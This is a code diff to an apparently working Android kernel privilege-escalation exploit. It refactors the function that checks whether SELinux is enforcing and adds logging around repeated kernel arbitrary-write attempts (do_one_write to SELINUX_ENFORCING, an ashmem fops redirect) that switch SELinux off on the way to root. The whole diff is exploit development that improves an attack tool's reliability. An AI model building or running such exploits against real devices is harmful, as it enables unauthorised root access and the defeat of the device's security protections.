@@ -262,13 +262,47 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
   return 1;
 }
 
-static int check_selinux_off(void) {
+enum selinux_check_state {
+  SELINUX_CHECK_UNKNOWN = -1,
+  SELINUX_CHECK_ENFORCING = 0,
+  SELINUX_CHECK_NOT_ENFORCING = 1,
+};
+
+static const char *selinux_check_state_name(enum selinux_check_state state) {
+  switch (state) {
+    case SELINUX_CHECK_ENFORCING: return "enforcing";
+    case SELINUX_CHECK_NOT_ENFORCING: return "not_enforcing";
+    default: return "unknown";
+  }
+}
+
+static enum selinux_check_state check_selinux_state(const char *context) {
   int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
-  if (efd < 0) return 1;
-  char b[4] = {0};
-  read(efd, b, sizeof(b));
+  if (efd < 0) {
+    int saved_errno = errno;
+    pr_info("SELinux check context=%s state=unknown stage=open errno=%d\n",
+            context, saved_errno);
+    return SELINUX_CHECK_UNKNOWN;
+  }
+
+  unsigned char b[4] = {0};
+  errno = 0;
+  ssize_t n = read(efd, b, sizeof(b));
+  int read_errno = n < 0 ? errno : 0;
   close(efd);
-  return b[0] == '0';
+
+  if (n < 1 || (b[0] != '0' && b[0] != '1')) {
+    pr_info("SELinux check context=%s state=unknown stage=read ret=%zd "
+            "errno=%d first_byte=0x%02x\n",
+            context, n, read_errno, b[0]);
+    return SELINUX_CHECK_UNKNOWN;
+  }
+
+  enum selinux_check_state state = b[0] == '0'
+      ? SELINUX_CHECK_NOT_ENFORCING : SELINUX_CHECK_ENFORCING;
+  pr_info("SELinux check context=%s state=%s ret=%zd first_byte=%c\n",
+          context, selinux_check_state_name(state), n, b[0]);
+  return state;
 }
 
 static int write_selinux_policy_fix_script(void) {
@@ -627,7 +661,8 @@ int run_exploit(int argc, char **argv) {
   write_root_script();
 
   /* Phase 1: Disable SELinux (+ optional fops redirect for UMH path) */
-  int selinux_ok = check_selinux_off();
+  enum selinux_check_state selinux_state = check_selinux_state("initial");
+  int selinux_ok = selinux_state == SELINUX_CHECK_NOT_ENFORCING;
   int umh_available = active_offsets &&
       active_offsets->off_system_unbound_wq &&
       active_offsets->off_ashmem_misc_fops;
@@ -641,7 +676,8 @@ int run_exploit(int argc, char **argv) {
     TIMER("pre-UMH drain");
     do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
     TIMER("fops redirect done");
-    selinux_ok = check_selinux_off();
+    selinux_state = check_selinux_state("after_umh_redirect");
+    selinux_ok = selinux_state == SELINUX_CHECK_NOT_ENFORCING;
   }
 
   if (!selinux_ok && !root_child_done) {
@@ -652,9 +688,20 @@ int run_exploit(int argc, char **argv) {
       pr_info("Write 1 attempt %d/5\n", att);
       do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
       usleep(100000);
-      if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
+      selinux_state = check_selinux_state("after_w1_attempt");
+      if (selinux_state == SELINUX_CHECK_NOT_ENFORCING) {
+        pr_success("SELinux no longer enforcing\n");
+        selinux_ok = 1;
+      } else {
+        pr_info("W1 attempt=%d did not confirm write state=%s\n", att,
+                selinux_check_state_name(selinux_state));
+      }
     }
-    if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
+    if (!selinux_ok) {
+      pr_error("Write 1 failed final_state=%s\n",
+               selinux_check_state_name(selinux_state));
+      return 1;
+    }
     TIMER("Write 1 complete");
   } else if (!selinux_ok && root_child_done) {
     selinux_ok = 1;
@@ -827,8 +874,9 @@ static int run_write1_only(void) {
   }
   kaslr_done = 1;
 
-  if (check_selinux_off()) {
-    pr_success("SELinux already off\n");
+  enum selinux_check_state selinux_state = check_selinux_state("before_w1");
+  if (selinux_state == SELINUX_CHECK_NOT_ENFORCING) {
+    pr_success("SELinux already not enforcing\n");
     return 0;
   }
 
@@ -837,12 +885,16 @@ static int run_write1_only(void) {
     pr_info("Write 1 attempt %d/20\n", att);
     do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
     usleep(100000);
-    if (check_selinux_off()) {
-      pr_success("SELinux DISABLED\n");
+    selinux_state = check_selinux_state("after_w1_attempt");
+    if (selinux_state == SELINUX_CHECK_NOT_ENFORCING) {
+      pr_success("SELinux no longer enforcing\n");
       return 0;
     }
+    pr_info("W1 attempt=%d did not confirm write state=%s\n", att,
+            selinux_check_state_name(selinux_state));
   }
-  pr_error("Write 1 failed after 20 attempts\n");
+  pr_error("Write 1 failed after 20 attempts final_state=%s\n",
+           selinux_check_state_name(selinux_state));
   return 1;
 }
 
